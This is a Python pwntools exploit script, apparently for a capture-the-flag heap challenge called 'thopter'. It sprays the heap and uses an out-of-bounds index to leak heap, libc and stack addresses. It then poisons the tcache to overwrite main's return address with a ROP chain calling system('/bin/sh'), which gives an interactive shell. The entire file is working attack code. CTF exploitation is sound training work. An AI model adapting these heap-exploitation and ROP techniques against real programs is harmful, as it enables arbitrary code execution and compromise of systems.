from pwn import *

path = "./thopter"
context.binary = path
e = context.binary

libc = ELF("./libc.so.6")

p = gdb.debug(path, '''
    c
''')
#p = remote("localhost", 1447)
#p = remote("challs.umdctf.io", 31727)

def numb(num):
    return str(num).encode('ascii')

def set_pilot(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', numb(idx))
    p.sendlineafter(b'len: ', numb(size))
    p.sendlineafter(b'name: ', data)

def set_id(idx, num):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', numb(idx))
    p.sendlineafter(b'id: ', numb(num))

def get_id(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', numb(idx))
    p.recvuntil(b'ornithopter ')
    return int(p.recvuntil(b'has been', drop=True))

# https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c#L1033
brk_gap = 0x2000000

# allocate very large pilots to allow for heap spray
# expand heap to very beeg size
log.info(f"spraying heap...")
borderline = 0x20000 - 0x10
for i in range(250):
    set_pilot(i, borderline - 8, b'A' * 8)

# we have gotten as far as we can like this
# now we taken advantage of how far we have gotten and consolidate stuff below the top chunk
log.info(f"consolidating lower chunks...")
for i in range(0, 249):
    set_pilot(i, 0x420 - 8, b'B' * 8)
remainder_size = borderline * 249 - 0x420 * 249
set_pilot(0, remainder_size - 8, b'C' * 8)

# extend just a bit further
log.info(f"extending top further...")
for i in range(1, 100):
    set_pilot(i, borderline - 8, b'D' * 8)

# idx 99 is at highest idx
# "free" the rest of the heap by allocating very large mmap size chunks
# due to lazy mapping, this is actually fine (i think)
log.info(f"freeing lower chunks...")
for i in range(0, 99):
    set_pilot(i, 0x3000000, b'A' * 8)
for i in range(100, 250):
    set_pilot(i, 0x3000000, b'A' * 8)

#payload = cyclic(brk_gap + 0x290 - 2, n=8)
#log.info(f"allocating massive cyclic chunk of size {len(payload)}")

# now we have a massive heap
# allocate a brk_gap sized chunk w/ cyclic to leak heap offset
log.info(f"leaking heap offset from ELF...")
set_pilot(0, brk_gap + 0x290, b'Z' * 0x8000)

# idx that goes off the binary
end_idx = (0x6539a596a000 - 0x6539a5967040) // 0x10
leak_idx = end_idx + (brk_gap + 0x290) // 0x10

#find leak by scanning down the heap until we find ZZZZZZZZ
while get_id(leak_idx) != u64(b"ZZZZZZZZ"):
    leak_idx -= 0x8000 // 0x10

# find edge page of leak
while get_id(leak_idx) == u64(b"ZZZZZZZZ"):
    leak_idx -= 0x1000 // 0x10

#chunk_offset = cyclic_find(get_id(leak_idx), n=8)
#chunk_idx = leak_idx - chunk_offset // 0x10 - 1
heap_idx = leak_idx - 0x290 // 0x10

log.info(f"heap idx: {heap_idx}")

set_pilot(1, 0xb7e7a0, b'A' * 8)

# leak libc and heap
large_idx = heap_idx + (0x55e1f840b540 - 0x55e1f640b000) // 16
leak = get_id(large_idx)
libc.address = leak - (0x7e0ca66042f0 - 0x7e0ca6400000)
log.info(f"libc base: 0x{libc.address:x}")
leak = get_id(large_idx + 1)
heap = leak - (0x58575883f530 - 0x58575683f000)
log.info(f"heap base: 0x{heap:x}")

# tcache poisoning on 0x20 tcache
# set count and 0x30 head to environ
#mask = (heap + (0x55df4ee78530 - 0x55df4ce78000)) >> 12
tcache_count_idx = heap_idx + 1
tcache_head_idx = heap_idx + 1 + (64 * 2 // 0x10)
libc_argv = libc.address + (0x79bf388046e0 - 0x79bf38600000)
set_pilot(tcache_count_idx, 0x20-8, b'A' * 8)
set_id(tcache_head_idx, libc_argv)
#set_pilot(heap_idx + 1 + (64 * 2 // 0x10), 0x20-8, p64(mask ^ libc.symbols['environ']))

# when we alloc, we get a chunk at environ
# however, the more interesting part is that tcache 0x30 head is now set to
# the stack address that was at environ
# it's mangled, but that's fine since we know the address of libc
set_pilot(3, 0x30-8, b'\x00' * 7)

mask = libc_argv >> 12
argv = get_id(tcache_head_idx) ^ mask
log.info(f"argv: 0x{argv:x}")

retaddr = argv - (0x7ffcfaac39c8 - 0x7ffcfaac38a8) - 8
log.info(f"retaddr: 0x{retaddr:x}")

# tcache poison again to write to retaddr of main
pop_rdi = libc.address + 0x10f75b
ret = pop_rdi + 1
binsh = next(libc.search(b"/bin/sh\x00"))
payload = b'A' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'])[:-1]
set_id(tcache_head_idx, retaddr)
set_pilot(4, 0x30-8, payload)

# exit called due to newline overflow from payload

p.interactive()
